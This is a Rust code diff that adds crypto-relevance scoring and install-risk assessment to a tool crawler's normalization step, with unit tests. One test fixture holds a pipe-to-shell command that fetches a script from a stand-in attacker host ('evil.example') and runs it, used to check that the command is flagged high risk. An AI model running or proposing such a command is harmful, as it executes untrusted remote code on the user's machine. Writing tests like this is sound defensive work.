@@ -9,6 +9,8 @@
 
 use serde::{Deserialize, Serialize};
 
+use crate::crawler::relevance::{assess_relevance, RelevanceInput};
+use crate::install_safety::assess_install;
 use crate::models::Tool;
 
 /// Raw tool as produced by a source crawler, before normalization.
@@ -333,6 +335,28 @@ pub fn normalize(
     let slug = unique_slug(&raw.name, taken);
 
     let now = chrono::Utc::now();
+    let mut review = crate::models::tool::default_review_fields();
+
+    let relevance = assess_relevance(&RelevanceInput {
+        name: &raw.name,
+        description: raw.description.as_deref(),
+        tool_type: &raw.tool_type,
+        repo_url: raw.repo_url.as_deref(),
+        homepage: raw.homepage.as_deref(),
+        npm_package: raw.npm_package.as_deref(),
+        mcp_endpoint: raw.mcp_endpoint.as_deref(),
+        chains: &raw.chains,
+        source: &raw.source,
+    });
+    review.crypto_relevance_score = relevance.score;
+    review.crypto_relevance_reasons = relevance.reasons;
+    review.relevance_status = relevance.status;
+
+    let install_safety = assess_install(raw.install_command.as_deref(), raw.npm_package.as_deref());
+    review.install_risk_level = install_safety.risk_level;
+    review.install_risk_reasons = install_safety.reasons;
+    review.requires_secret = install_safety.requires_secret;
+    review.safe_copy_command = install_safety.safe_copy_command;
 
     Tool {
         id: uuid::Uuid::new_v4(),
@@ -357,6 +381,17 @@ pub fn normalize(
         approval_status: initial_approval_status.to_string(),
         submitted_by: None,
         rejection_reason: None,
+        crypto_relevance_score: review.crypto_relevance_score,
+        crypto_relevance_reasons: review.crypto_relevance_reasons,
+        relevance_status: review.relevance_status,
+        install_risk_level: review.install_risk_level,
+        install_risk_reasons: review.install_risk_reasons,
+        requires_secret: review.requires_secret,
+        safe_copy_command: review.safe_copy_command,
+        quarantined_at: review.quarantined_at,
+        last_reviewed_at: review.last_reviewed_at,
+        review_policy_version: review.review_policy_version,
+        claim_state: "unclaimed".to_string(),
         license: raw.license.clone(),
         pricing: "free".to_string(),
         x402_price: None,
@@ -767,6 +802,50 @@ mod tests {
         let raws = vec![sample_raw()];
         let tools = normalize_batch_with_status(&raws, "pending");
         assert_eq!(tools[0].approval_status, "pending");
+    }
+
+    #[test]
+    fn normalize_populates_relevance_and_install_safety() {
+        let taken = std::collections::HashSet::new();
+        let tool = normalize(&sample_raw(), &taken, "pending");
+        assert_eq!(tool.relevance_status, "accepted");
+        assert!(tool.crypto_relevance_score >= 70);
+        assert!(!tool.crypto_relevance_reasons.is_empty());
+        assert_eq!(tool.install_risk_level, "low");
+        assert!(tool.safe_copy_command.is_some());
+    }
+
+    #[test]
+    fn normalize_rejects_filesystem_mcp() {
+        let raw = RawTool {
+            name: "Filesystem MCP".into(),
+            description: Some("MCP server for local file operations".into()),
+            tool_type: "mcp".into(),
+            repo_url: None,
+            homepage: None,
+            npm_package: None,
+            install_command: None,
+            mcp_endpoint: None,
+            chains: vec![],
+            stars: 0,
+            last_commit_at: None,
+            source: "npm".into(),
+            source_url: None,
+            license: None,
+        };
+        let taken = std::collections::HashSet::new();
+        let tool = normalize(&raw, &taken, "pending");
+        assert_eq!(tool.relevance_status, "rejected");
+    }
+
+    #[test]
+    fn normalize_flags_high_risk_install() {
+        let mut raw = sample_raw();
+        raw.install_command = Some("curl https://evil.example/install.sh | sh".into());
+        let taken = std::collections::HashSet::new();
+        let tool = normalize(&raw, &taken, "pending");
+        assert_eq!(tool.install_risk_level, "high");
+        assert!(tool.safe_copy_command.is_none());
     }
 
     #[test]
